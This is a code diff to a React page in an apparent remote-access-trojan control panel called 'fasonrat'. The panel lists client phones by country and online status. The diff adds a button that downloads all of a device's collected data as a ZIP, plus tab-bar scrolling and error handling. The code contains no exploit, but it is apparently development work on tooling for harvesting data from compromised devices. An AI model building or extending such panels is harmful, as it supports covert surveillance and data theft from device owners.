@@ -1,4 +1,4 @@
-import { useEffect, useState, useCallback } from 'react';
+import { useEffect, useState, useCallback, useRef } from 'react';
 import { useParams, useNavigate, NavLink, Outlet } from 'react-router-dom';
 import { clientsApi } from '@/services/api';
 import type { ClientDevice, DeviceOutletContext } from '@/types';
@@ -7,18 +7,32 @@ import { useDevicesStore } from '@/store/devices';
 import { getDeviceTabs } from '@/config/navigation';
 import { Badge } from '@/components/ui/badge';
 import { Button } from '@/components/ui/button';
-import { Smartphone, RefreshCw, Trash2, AlertCircle } from 'lucide-react';
+import { Smartphone, RefreshCw, Trash2, AlertCircle, Download, Loader2 } from 'lucide-react';
 import { cn, getCountryFlag } from '@/lib/utils';
 
 export default function DevicePage() {
   const { id } = useParams<{ id: string }>();
   const navigate = useNavigate();
+  const desktopTabBarRef = useRef<HTMLDivElement>(null);
   const { hasPermission } = useAuthStore();
   const deleteDeviceFromStore = useDevicesStore((s) => s.deleteDevice);
   const deviceTabs = getDeviceTabs(hasPermission);
   const [client, setClient] = useState<ClientDevice | null>(null);
   const [loading, setLoading] = useState(true);
   const [error, setError] = useState<string | null>(null);
+
+  useEffect(() => {
+    if (loading || !client) return;
+    const el = desktopTabBarRef.current;
+    if (!el) return;
+    const onWheel = (e: WheelEvent) => {
+      if (e.deltaY === 0) return;
+      e.preventDefault();
+      el.scrollLeft += e.deltaY;
+    };
+    el.addEventListener('wheel', onWheel, { passive: false });
+    return () => el.removeEventListener('wheel', onWheel);
+  }, [id, loading, client]);
 
   const loadClient = useCallback(async () => {
     if (!id) return;
@@ -32,7 +46,7 @@ export default function DevicePage() {
         setError('Device not found');
       }
     } catch {
-      setError('Failed to load device. It may not exist or the server is unreachable.');
+      setError('Failed to load device. It may not exist or server is unreachable.');
     }
     setLoading(false);
   }, [id]);
@@ -42,15 +56,45 @@ export default function DevicePage() {
   }, [loadClient]);
 
   const [showDeleteConfirm, setShowDeleteConfirm] = useState(false);
+  const [exporting, setExporting] = useState(false);
+  const [actionError, setActionError] = useState<string | null>(null);
+
+  const handleExport = async () => {
+    if (!id) return;
+    setExporting(true);
+    setActionError(null);
+    try {
+      const { fetchAuthBlob } = await import('@/services/api');
+      const blob = await fetchAuthBlob(`/api/client/${id}/export`);
+      if (!blob) throw new Error('Export failed');
+      const url = window.URL.createObjectURL(blob);
+      const link = document.createElement('a');
+      link.href = url;
+      link.download = `fasonrat-data-${id}.zip`;
+      document.body.appendChild(link);
+      link.click();
+      link.remove();
+      setTimeout(() => window.URL.revokeObjectURL(url), 1000);
+    } catch (err: any) {
+      setActionError(err?.message || 'Failed to export device data');
+    } finally {
+      setExporting(false);
+    }
+  };
 
   const handleDelete = async () => {
     if (!id) return;
+    setActionError(null);
     try {
       const ok = await deleteDeviceFromStore(id);
       if (ok) {
         navigate('/devices');
+      } else {
+        setActionError('Delete failed. Device may already be removed.');
       }
-    } catch { /* ignore */ }
+    } catch (err: any) {
+      setActionError(err?.message || 'Failed to delete device');
+    }
     setShowDeleteConfirm(false);
   };
 
@@ -91,7 +135,7 @@ export default function DevicePage() {
               ←
             </Button>
             <div className="h-9 w-9 rounded-lg bg-primary/10 flex items-center justify-center shrink-0">
-              <Smartphone className="h-4.5 w-4.5 text-primary" />
+              <Smartphone className="h-5 w-5 text-primary" />
             </div>
             <div className="flex-1 min-w-0">
               <div className="flex items-center gap-2">
@@ -118,6 +162,11 @@ export default function DevicePage() {
               <Button variant="ghost" size="icon" onClick={loadClient} disabled={loading} className="h-8 w-8" aria-label="Refresh device">
                 <RefreshCw className={`h-3.5 w-3.5 ${loading ? 'animate-spin' : ''}`} />
               </Button>
+              {hasPermission('files:download') && hasPermission('device:view') && (
+                <Button variant="ghost" size="icon" onClick={handleExport} disabled={exporting} className="h-8 w-8 text-muted-foreground hover:text-primary" aria-label="Download all data" title="Download all data as ZIP">
+                  {exporting ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : <Download className="h-3.5 w-3.5" />}
+                </Button>
+              )}
               {hasPermission('device:delete') && !showDeleteConfirm && (
                 <Button variant="ghost" size="icon" onClick={() => setShowDeleteConfirm(true)} className="h-8 w-8 text-muted-foreground hover:text-destructive" aria-label="Delete device">
                   <Trash2 className="h-3.5 w-3.5" />
@@ -139,7 +188,7 @@ export default function DevicePage() {
 
         <div className="border-t">
           <div className="hidden md:block">
-            <div className="flex items-center overflow-x-auto px-2 gap-0.5 scrollbar-none">
+            <div ref={desktopTabBarRef} className="flex items-center overflow-x-auto px-2 gap-0.5">
               {deviceTabs.map((tab) => (
                 <NavLink
                   key={tab.to}
@@ -188,7 +237,13 @@ export default function DevicePage() {
         <div className="mx-4 md:mx-6 lg:mx-8 mt-2 p-2.5 rounded-lg bg-warning/10 border border-warning/20 text-warning text-xs flex items-center gap-2">
           <AlertCircle className="h-3.5 w-3.5 shrink-0" />
           <span className="font-medium">Device Offline</span>
-          <span className="text-warning/70">— Some features may be unavailable until the device reconnects.</span>
+          <span className="text-warning/70">Some features are unavailable while offline.</span>
+        </div>
+      )}
+      {actionError && (
+        <div className="mx-4 md:mx-6 lg:mx-8 mt-2 p-3 rounded-lg bg-destructive/10 border border-destructive/20 text-destructive text-sm flex items-center gap-2">
+          <AlertCircle className="h-4 w-4 shrink-0" /> {actionError}
+          <button onClick={() => setActionError(null)} className="ml-auto text-xs hover:text-destructive/80">Dismiss</button>
         </div>
       )}
       <div className="p-4 md:p-6 lg:p-8 pt-2 md:pt-4 lg:pt-6">
